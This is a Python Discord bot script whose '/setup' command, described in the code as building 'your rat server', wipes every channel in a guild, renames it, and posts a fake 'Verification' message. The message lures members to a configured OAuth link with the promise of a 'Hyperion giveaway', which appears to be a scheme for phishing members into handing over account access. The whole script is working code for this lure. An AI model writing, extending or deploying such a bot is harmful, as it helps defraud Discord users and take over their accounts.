import discord
from discord.ext import commands
import json
import os
import colorama
from colorama import init, Fore
init(autoreset=True)

with open("./config.json") as f:
    config = json.load(f)

# set the token to the token in the config file
token = config["discord"]["bot_token"]
oauth = config["oauth"]["oauth_url"]
guild_name = config["guild_name"]["guild_name"]

client = commands.Bot()

os.system("cls")    
print(Fore.GREEN + "Bot is online you can now use /setup!")

@client.slash_command(name="setup", description="Build up your rat server.")
async def threeplans(ctx):
    
    for channel in ctx.guild.channels:
        await channel.delete()
        await ctx.guild.edit(name=guild_name)
    Verification = await client.guilds[0].create_category("✅ | Verfication")
    await Verification.set_permissions(client.guilds[0].default_role, send_messages=False, add_reactions=False)
    Verification = await client.guilds[0].create_text_channel("✅│verify", category=Verification)
    verificationembed = discord.Embed(
            title = "Verification",
            description = "Verification is required to view this server.",
            color = 0x0000FF
            )  
    verificationembed.add_field(name="Why?", value="Deploying a robust verification mechanism can effectively deter disruptive activities such as server raids, spamming, and unauthorized terminations, thereby ensuring the stable and secure operation of the server.", inline=False)
    verificationembed.add_field(name="Verification", value=f"Click [here]({oauth}) to verify yourself!", inline=False)
    verificationembed.set_footer(text=f"We are currently running a Hyperion giveaway. To access it, you will need to verify your information.")
    await Verification.send(embed=verificationembed)
    Giveaway = await client.guilds[0].create_category("🎉|Giveaway")
    await Giveaway.set_permissions(client.guilds[0].default_role, send_messages=False, add_reactions=False, read_messages=False)
    Giveaway = await client.guilds[0].create_text_channel("🎉│Giveaway", category=Giveaway)
    print(Fore.BLUE + "Setup was Successfully :D")
            
client.run(token)
